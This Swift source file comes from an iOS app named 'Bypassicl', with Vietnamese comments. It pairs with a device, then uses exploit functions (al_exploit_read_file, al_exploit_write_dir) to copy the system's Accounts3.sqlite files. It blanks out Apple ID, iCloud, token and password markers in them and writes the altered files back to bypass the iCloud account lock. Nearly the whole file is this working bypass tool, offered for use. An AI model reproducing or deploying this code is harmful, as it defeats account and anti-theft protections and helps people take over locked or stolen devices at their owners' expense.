// ============================================================
// AirliftService.swift — Bypassicl (Full Complete Version)
// ============================================================

import Foundation
import Combine
import UniformTypeIdentifiers
import Network
import AVFoundation
import UIKit
import UserNotifications
import BackgroundTasks

@MainActor
class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    @Published var isPairing = false
    @Published var currentPin: String? = nil
    @Published var pairingFilePath: String? = nil
    @Published var lastDeviceName: String? = nil
    
    @Published var isProcessing = false
    @Published var showAlert = false
    @Published var alertMessage = ""
    @Published var isVPNConnected = false
    
    private var netService: NetService?
    private var audioPlayer: AVAudioPlayer?
    private var bgTask: BGContinuedProcessingTask?
    private var pairingStarted = false
    private var taskFinished = false
    private var vpnTimer: Timer?
    
    private let localNetwork = LocalNetworkAuthorization()
    
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    
    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("AccountsBackup")
    }
    
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    
    var hasCompleteBackup: Bool {
        let fm = FileManager.default
        return targetFiles.allSatisfy { file in
            let url = backupDir.appendingPathComponent(file)
            var isDir: ObjCBool = false
            return fm.fileExists(atPath: url.path, isDirectory: &isDir) && !isDir.boolValue
        }
    }
    
    override init() {
        super.init()
        registerBackgroundTask()
        startVPNMonitor()
        _ = connect()
    }
    
    func log(_ message: String) {
        self.logs += message + "\n"
        print(message)
    }
    
    private func presentAlert(_ message: String) {
        self.alertMessage = message
        self.showAlert = true
    }
    
    // ============================================================
    // QUÉT VPN LOCALDEV REALTIME
    // ============================================================
    private func startVPNMonitor() {
        checkVPNNow()
        vpnTimer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] _ in
            guard let self = self else { return }
            Task { @MainActor in
                self.checkVPNNow()
            }
        }
        RunLoop.main.add(vpnTimer!, forMode: .common)
    }
    
    private func checkVPNNow() {
        var address: UnsafeMutablePointer<ifaddrs>?
        var isUp = false
        if getifaddrs(&address) == 0 {
            var ptr = address
            while ptr != nil {
                let interface = ptr!.pointee
                let name = String(cString: interface.ifa_name)
                let family = interface.ifa_addr.pointee.sa_family
                if name.hasPrefix("utun") && family == UInt8(AF_INET) {
                    var addr = interface.ifa_addr.pointee
                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                    getnameinfo(&addr, socklen_t(interface.ifa_addr.pointee.sa_len), &hostname, socklen_t(hostname.count), nil, socklen_t(0), NI_NUMERICHOST)
                    let ip = String(cString: hostname)
                    if ip.hasPrefix("10.7.") { isUp = true; break }
                }
                ptr = interface.ifa_next
            }
            freeifaddrs(address)
        }
        if self.isVPNConnected != isUp {
            self.isVPNConnected = isUp
            self.log(isUp ? "✅ Đã phát hiện VPN LocalDev" : "⚠️ VPN LocalDev đã tắt")
        }
    }
    
    // ============================================================
    // FFI CALLBACKS
    // ============================================================
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        if let rawString = String(validatingUTF8: msg) {
            let cleanString = rawString.replacingOccurrences(of: "\u{001B}\\[[0-9;]*[a-zA-Z]", with: "", options: .regularExpression)
            Task { @MainActor in service.log("[Airlift] \(cleanString)") }
        }
    }
    
    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let ctx = ctx, let pin = pin else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let pinStr = String(cString: pin)
        Task { @MainActor in
            service.currentPin = pinStr
            service.presentPin(pinStr)
        }
    }
    
    private static let readyCallback: ALPairReadyCb = { ctx, serviceID, port, keys, vals, count in
        guard let ctx = ctx, let serviceID = serviceID else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let id = String(cString: serviceID)
        var txt: [String: Data] = [:]
        if let keys = keys, let vals = vals {
            for i in 0..<Int(count) {
                guard let k = keys[i], let v = vals[i] else { continue }
                txt[String(cString: k)] = Data(String(cString: v).utf8)
            }
        }
        Task { @MainActor in service.startAdvertising(serviceID: id, port: Int32(port), txt: txt) }
    }
    
    nonisolated private func registerBackgroundTask() {
        if #available(iOS 26.0, *) {
            let taskId = (Bundle.main.bundleIdentifier ?? "com.bypassicl.app") + ".pairing"
            BGTaskScheduler.shared.register(forTaskWithIdentifier: taskId, using: DispatchQueue.main) { task in
                guard let task = task as? BGContinuedProcessingTask else { return }
                MainActor.assumeIsolated { AirliftService.shared.runPairing(task: task) }
            }
        }
    }
    
    private func startKeepAliveAudio() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, options: [.mixWithOthers])
            try session.setActive(true)
            let sr: UInt32 = 8000, ns: UInt32 = 8000, ds = ns * 2
            var wav = Data()
            wav.append("RIFF".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: (36 + ds).littleEndian) { Data($0) })
            wav.append("WAVEfmt ".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: UInt32(16).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: sr.littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: (sr * 2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(16).littleEndian) { Data($0) })
            wav.append("data".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: ds.littleEndian) { Data($0) })
            wav.append(Data(count: Int(ds)))

            let player = try AVAudioPlayer(data: wav)
            player.numberOfLoops = -1
            player.volume = 0.01
            player.play()
            audioPlayer = player
        } catch { log("⚠️ Audio error: \(error.localizedDescription)") }
    }

    private func stopKeepAliveAudio() {
        audioPlayer?.stop()
        audioPlayer = nil
        try? AVAudioSession.sharedInstance().setActive(false)
    }
    
    // ============================================================
    // PAIRING LOGIC
    // ============================================================
    func startPairingOnDevice() {
        guard !isPairing else { return }
        self.isPairing = true
        self.currentPin = nil
        self.pairingStarted = false
        self.log("[*] Starting Pair on Device...")
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound]) { _, _ in }
        self.startKeepAliveAudio()
        Task.detached { [weak self] in _ = await self?.localNetwork.request() }
        self.submitBackgroundTask()
    }
    
    private func submitBackgroundTask() {
        if #available(iOS 26.0, *) {
            let taskId = (Bundle.main.bundleIdentifier ?? "com.bypassicl.app") + ".pairing"
            let request = BGContinuedProcessingTaskRequest(identifier: taskId, title: "Bypassicl", subtitle: "Waiting for a device…")
            request.strategy = .queue
            do { try BGTaskScheduler.shared.submit(request) } catch {}
        }
        self.runPairing(task: nil)
    }
    
    private func runPairing(task: BGContinuedProcessingTask?) {
        guard !pairingStarted else { return }
        pairingStarted = true
        taskFinished = false
        bgTask = task
        
        task?.progress.totalUnitCount = 100
        task?.progress.completedUnitCount = 5
        task?.expirationHandler = { [weak self] in
            guard let self = self else { return }
            Task { @MainActor in
                self.isPairing = false
                self.finishTask(success: false)
            }
        }
        
        let outPath = self.documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        DispatchQueue.global(qos: .userInitiated).async {
            var isSuccess = false
            var finalPath: String? = nil
            var finalName: String? = nil

            while true {
                var shouldContinue = false
                DispatchQueue.main.sync { shouldContinue = self.isPairing }
                if !shouldContinue { break }

                var result = ALPairResult()
                let code = al_pairing_run_host(
                    "0.0.0.0", 0, "Bypassicl", "Mac17,7", outPath, nil,
                    AirliftService.readyCallback, AirliftService.pinCallback, ctx, &result
                )

                if code == 0 {
                    isSuccess = true
                    if let p = result.pairing_file_path { finalPath = String(cString: p) }
                    if let n = result.device_name { finalName = String(cString: n) }
                    al_pairing_result_free(&result)
                    break
                } else {
                    al_pairing_result_free(&result)
                    DispatchQueue.main.async { self.currentPin = nil }
                    Thread.sleep(forTimeInterval: 0.5)
                }
            }

            DispatchQueue.main.async {
                self.pairingStarted = false
                self.isPairing = false
                self.currentPin = nil
                self.stopAdvertising()
                self.stopKeepAliveAudio()

                if isSuccess {
                    self.pairingFilePath = finalPath
                    self.lastDeviceName = finalName
                    self.log("✅ Pairing successful!")
                    self.presentAlert("Pairing Thành Công!")
                } else {
                    self.log("⏹ Pairing cancelled.")
                }
                self.finishTask(success: isSuccess)
            }
        }
    }
    
    private func finishTask(success: Bool) {
        guard !taskFinished else { return }
        taskFinished = true
        if #available(iOS 26.0, *) {
            bgTask?.setTaskCompleted(success: success)
        }
        bgTask = nil
    }
    
    private func startAdvertising(serviceID: String, port: Int32, txt: [String: Data]) {
        stopAdvertising()
        let service = NetService(domain: "", type: "_remotepairing-pairable-host._tcp.", name: serviceID, port: port)
        service.setTXTRecord(NetService.data(fromTXTRecord: txt))
        service.schedule(in: .main, forMode: .common)
        service.delegate = self
        service.publish()
        netService = service
        log("🔊 Bonjour publishing: \(serviceID) @ \(port)")
    }
    
    private func stopAdvertising() {
        netService?.stop()
        netService = nil
    }
    
    private func presentPin(_ pin: String) {
        if #available(iOS 26.0, *) {
            bgTask?.progress.completedUnitCount = 50
            bgTask?.updateTitle("Bypassicl", subtitle: "Enter code \(pin)")
        }
        let content = UNMutableNotificationContent()
        content.title = "Bypassicl pairing code"
        content.body = "Enter \(pin) on this device to pair."
        content.sound = .default
        UNUserNotificationCenter.current().add(UNNotificationRequest(identifier: "bypassicl.pin", content: content, trigger: nil))
    }

    // ============================================================
    // CONNECT / IMPORT / DELETE
    // ============================================================
    func connect() -> Bool {
        if pairingFilePath == nil || !FileManager.default.fileExists(atPath: pairingFilePath!) {
            for name in ["pairingRecord.mobiledevicepairing", "pairingRecord.plist", "pairing.plist"] {
                let url = documentsDir.appendingPathComponent(name)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path
                    break
                }
            }
        }
        return pairingFilePath != nil && FileManager.default.fileExists(atPath: pairingFilePath!)
    }

    func importPairingFile(from url: URL) {
        let accessing = url.startAccessingSecurityScopedResource()
        defer { if accessing { url.stopAccessingSecurityScopedResource() } }
        do {
            let fm = FileManager.default
            try fm.createDirectory(at: documentsDir, withIntermediateDirectories: true)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
            
            var data: Data? = try? Data(contentsOf: url)
            if data == nil {
                var coordError: NSError?
                NSFileCoordinator().coordinate(readingItemAt: url, options: .withoutChanges, error: &coordError) { readURL in
                    data = try? Data(contentsOf: readURL)
                }
            }
            
            guard let fileData = data, !fileData.isEmpty else {
                self.log("❌ Import failed: không đọc được dữ liệu file.")
                self.presentAlert("Không đọc được file pairing đã chọn.")
                return
            }
            
            if fm.fileExists(atPath: dest.path) {
                try fm.removeItem(at: dest)
            }
            try fileData.write(to: dest, options: .atomic)
            self.pairingFilePath = dest.path
            self.log("✅ Pairing file imported (\(fileData.count) bytes)")
            self.presentAlert("Import Pairing File Thành Công!")
        } catch {
            self.log("❌ Import failed: \(error.localizedDescription)")
            self.presentAlert("Import lỗi: \(error.localizedDescription)")
        }
    }

    func deletePairingFile() {
        guard let path = pairingFilePath else { return }
        do {
            try FileManager.default.removeItem(atPath: path)
            self.pairingFilePath = nil
            self.log("🗑 Đã xoá Pairing File.")
            self.presentAlert("Đã xoá Pairing File thành công!")
        } catch {
            self.log("❌ Lỗi xoá file: \(error.localizedDescription)")
            self.presentAlert("Lỗi xoá file: \(error.localizedDescription)")
        }
    }

    // ============================================================
    // FFI HELPERS
    // ============================================================
    nonisolated private func ffi_read_file_internal(pairingPath: String, iosPath: String) -> Data? {
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        let result = al_exploit_read_file(pairingPath, iosPath, nil, nil, &outData, &outLen, &outError)
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        if result == 0 {
            if let ptr = outData, outLen > 0 { return Data(bytes: ptr, count: Int(outLen)) }
            else { return Data() }
        }
        return nil
    }

    nonisolated private func ffi_write_dir_internal(pairingPath: String, sourceDir: String, targetDir: String) -> Bool {
        var outError: UnsafeMutablePointer<CChar>? = nil
        let result = al_exploit_write_dir(pairingPath, sourceDir, targetDir, nil, nil, &outError)
        defer { if let e = outError { al_string_free(e) } }
        return result == 0
    }

    nonisolated private func sanitizeAccountData(_ originalData: Data) -> Data {
        guard !originalData.isEmpty else { return originalData }
        var bytes = [UInt8](originalData)
        let markers = [
            "appleid", "icloud", "@icloud.com", "@me.com", "@mac.com",
            "@gmail.com", "authToken", "password", "dsPrsID", "altDSID"
        ]
        for marker in markers {
            guard let pattern = marker.data(using: .utf8), !pattern.isEmpty else { continue }
            let patBytes = [UInt8](pattern)
            if bytes.count < patBytes.count { continue }
            var i = 0
            while i <= bytes.count - patBytes.count {
                let slice = bytes[i..<(i + patBytes.count)]
                if String(bytes: slice, encoding: .utf8)?.lowercased() == marker.lowercased() {
                    for j in i..<(i + patBytes.count) { bytes[j] = 0x00 }
                    i += patBytes.count
                } else {
                    i += 1
                }
            }
        }
        return Data(bytes)
    }

    // ============================================================
    // BYPASS: BACKUP 3 FILE -> LÀM SẠCH & GHI ĐÈ LẠI 3 FILE
    // ============================================================
    func bypassICloud() {
        guard !isProcessing else { return }
        guard connect(), let pairingPath = pairingFilePath else {
            log("❌ Bypass failed: Missing Pairing File.")
            presentAlert("Chưa có Pairing File.")
            return
        }
        
        isProcessing = true
        log("[*] Bắt đầu Bypass (Backup 3 file & ghi đè lại 3 file)...")
        
        let backupURL = self.backupDir
        let alreadyBackedUp = self.hasCompleteBackup
        let files = self.targetFiles
        let remoteAccountsDir = self.accountsDir
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self = self else { return }
            let fm = FileManager.default
            
            if !alreadyBackedUp {
                do {
                    try fm.createDirectory(at: backupURL, withIntermediateDirectories: true)
                } catch {
                    DispatchQueue.main.async {
                        self.log("❌ Không tạo được thư mục backup: \(error.localizedDescription)")
                        self.presentAlert("Không tạo được thư mục AccountsBackup.")
                        self.isProcessing = false
                    }
                    return
                }
                
                DispatchQueue.main.async { self.log("[*] Đang backup 3 file gốc...") }
                for file in files {
                    let remotePath = "\(remoteAccountsDir)/\(file)"
                    guard let data = self.ffi_read_file_internal(pairingPath: pairingPath, iosPath: remotePath) else {
                        DispatchQueue.main.async {
                            self.log("❌ Backup thất bại tại \(file), hủy Bypass.")
                            self.presentAlert("Backup thất bại tại \(file).")
                            self.isProcessing = false
                        }
                        return
                    }
                    do {
                        try data.write(to: backupURL.appendingPathComponent(file), options: .atomic)
                        DispatchQueue.main.async { self.log("✅ Backup \(file) (\(data.count) bytes)") }
                    } catch {
                        DispatchQueue.main.async {
                            self.log("❌ Lưu backup \(file) lỗi: \(error.localizedDescription)")
                            self.presentAlert("Lỗi lưu file backup \(file).")
                            self.isProcessing = false
                        }
                        return
                    }
                }
            } else {
                DispatchQueue.main.async { self.log("ℹ️ Đã có đủ 3 file trong AccountsBackup, giữ nguyên bản gốc.") }
            }
            
            let bypassDir = fm.temporaryDirectory.appendingPathComponent("bypass_\(UUID().uuidString)")
            do {
                try fm.createDirectory(at: bypassDir, withIntermediateDirectories: true)
                for file in files {
                    let srcURL = backupURL.appendingPathComponent(file)
                    let rawData = try Data(contentsOf: srcURL)
                    let cleanedData = (file == "Accounts3.sqlite") ? self.sanitizeAccountData(rawData) : Data()
                    try cleanedData.write(to: bypassDir.appendingPathComponent(file), options: .atomic)
                    DispatchQueue.main.async { self.log("🧹 Đã xử lý \(file) (\(cleanedData.count) bytes)") }
                }
            } catch {
                try? fm.removeItem(at: bypassDir)
                DispatchQueue.main.async {
                    self.log("❌ Lỗi tạo file bypass: \(error.localizedDescription)")
                    self.presentAlert("Lỗi tạo file bypass.")
                    self.isProcessing = false
                }
                return
            }
            
            let ok = self.ffi_write_dir_internal(
                pairingPath: pairingPath,
                sourceDir: bypassDir.path,
                targetDir: remoteAccountsDir
            )
            try? fm.removeItem(at: bypassDir)
            
            Thread.sleep(forTimeInterval: 0.5)
            
            DispatchQueue.main.async {
                if ok {
                    self.log("🎉 BYPASS HOÀN TẤT! Tắt hẳn app Cài đặt rồi mở lại để kiểm tra.")
                    self.presentAlert("Bypass Hoàn Tất! Hãy tắt hẳn Cài đặt và mở lại.")
                } else {
                    self.log("❌ Bypass thất bại khi ghi vào \(remoteAccountsDir).")
                    self.presentAlert("Bypass thất bại. Kiểm tra log.")
                }
                self.isProcessing = false
            }
        }
    }

    // ============================================================
    // RESTORE: LẤY 3 FILE GỐC TỪ ACCOUNTSBACKUP GHI TRẢ LẠI
    // ============================================================
    func restoreOriginalAccounts() {
        guard !isProcessing else { return }
        guard connect(), let pairingPath = pairingFilePath else {
            log("❌ Restore failed: Missing Pairing File.")
            presentAlert("Chưa có Pairing File.")
            return
        }
        guard hasCompleteBackup else {
            log("❌ Restore failed: Chưa có đủ 3 file backup trong AccountsBackup.")
            presentAlert("Không tìm thấy đủ 3 file backup trong AccountsBackup.")
            return
        }
        
        isProcessing = true
        log("[*] Bắt đầu Restore nguyên vẹn 3 file từ AccountsBackup...")
        
        let backupURL = self.backupDir
        let files = self.targetFiles
        let remoteAccountsDir = self.accountsDir
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self = self else { return }
            let fm = FileManager.default
            let restoreDir = fm.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
            
            do {
                try fm.createDirectory(at: restoreDir, withIntermediateDirectories: true)
                for file in files {
                    let srcURL = backupURL.appendingPathComponent(file)
                    let data = try Data(contentsOf: srcURL)
                    try data.write(to: restoreDir.appendingPathComponent(file), options: .atomic)
                    DispatchQueue.main.async { self.log("📦 Nạp \(file) (\(data.count) bytes)") }
                }
            } catch {
                try? fm.removeItem(at: restoreDir)
                DispatchQueue.main.async {
                    self.log("❌ Lỗi đọc file backup: \(error.localizedDescription)")
                    self.presentAlert("Lỗi đọc file backup để Restore.")
                    self.isProcessing = false
                }
                return
            }
            
            let ok = self.ffi_write_dir_internal(
                pairingPath: pairingPath,
                sourceDir: restoreDir.path,
                targetDir: remoteAccountsDir
            )
            try? fm.removeItem(at: restoreDir)
            
            Thread.sleep(forTimeInterval: 0.5)
            
            DispatchQueue.main.async {
                if ok {
                    self.log("✅ RESTORE HOÀN TẤT! Đã trả lại nguyên vẹn 3 file từ bản backup.")
                    self.presentAlert("Restore Thành Công! Tắt hẳn Cài đặt và mở lại.")
                } else {
                    self.log("❌ Restore thất bại khi ghi về \(remoteAccountsDir).")
                    self.presentAlert("Restore thất bại. Kiểm tra log.")
                }
                self.isProcessing = false
            }
        }
    }
}

@MainActor
final class LocalNetworkAuthorization {
    private var browser: NWBrowser?
    private var listener: NWListener?
    private var continuation: CheckedContinuation<Bool, Never>?
    private let probeType = "_bypassiclprobe._tcp"

    func request(timeout: TimeInterval = 5) async -> Bool {
        await withCheckedContinuation { (cont: CheckedContinuation<Bool, Never>) in
            self.continuation = cont
            let params = NWParameters.tcp
            params.includePeerToPeer = true

            let listener = try? NWListener(using: params)
            listener?.service = NWListener.Service(name: "BypassiclProbe", type: probeType)
            listener?.newConnectionHandler = { $0.cancel() }
            listener?.stateUpdateHandler = { [weak self] state in
                if case .failed = state { Task { @MainActor in self?.finish(false) } }
            }
            self.listener = listener

            let browser = NWBrowser(for: .bonjour(type: probeType, domain: nil), using: params)
            browser.stateUpdateHandler = { [weak self] state in
                if case .failed = state { Task { @MainActor in self?.finish(false) } }
            }
            browser.browseResultsChangedHandler = { [weak self] results, _ in
                if !results.isEmpty { Task { @MainActor in self?.finish(true) } }
            }
            self.browser = browser

            listener?.start(queue: .main)
            browser.start(queue: .main)

            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                Task { @MainActor in self?.finish(false) }
            }
        }
    }

    private func finish(_ authorized: Bool) {
        guard let cont = continuation else { return }
        continuation = nil
        cont.resume(returning: authorized)
        browser?.cancel(); browser = nil
        listener?.cancel(); listener = nil
    }
}
